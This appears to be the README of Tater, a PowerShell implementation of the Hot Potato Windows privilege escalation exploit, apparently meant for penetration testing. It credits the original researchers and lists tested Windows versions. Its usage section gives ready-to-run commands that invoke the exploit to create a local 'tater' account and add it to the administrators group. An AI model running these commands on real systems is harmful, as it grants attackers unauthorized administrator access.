# Tater
Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit.    

# Credit
All credit goes to @breenmachine, @foxglovesec, Google Project Zero, and anyone else that helped work out the details for this exploit.  
 
Potato - https://github.com/foxglovesec/Potato   

# Notes
This version has been tested by me on Windows 7 and Windows 10. I will hopefully be able to test it on the remaining Windows versions soon. Feel free to open issues here or reach out on Twitter @kevin_robertson with successes or failures for the remaining OS versions. 

# Usage
To import with Import-Module:   
Import-Module ./Tater.ps1   

To import using dot source method:   
. ./Tater.ps1  
 
Invoke-Tater -Trigger 1 -Command "net user tater Winter2016 /add && net localgroup administrators tater /add"   

Invoke-Tater -Trigger 2 -Command "net user tater Winter2016 /add && net localgroup administrators tater /add"     

# Screenshots
Windows 7 using trigger 1 (NBNS WPAD Bruteforce + Windows Defender Signature Updates)
![tater2](https://cloud.githubusercontent.com/assets/5897462/12707930/d005af7c-c867-11e5-916d-20a015ed30ec.PNG)

Windows 10 using trigger 2 (WebClient Service + Scheduled Task)
![tater3](https://cloud.githubusercontent.com/assets/5897462/12707953/1f77c48c-c868-11e5-8ea3-5e0e26cd3bdd.PNG)

Windows 7 using trigger 1 and UDP port exhaustion
![tater4](https://cloud.githubusercontent.com/assets/5897462/12708234/673e3794-c86b-11e5-8cc0-398b7170b73f.PNG)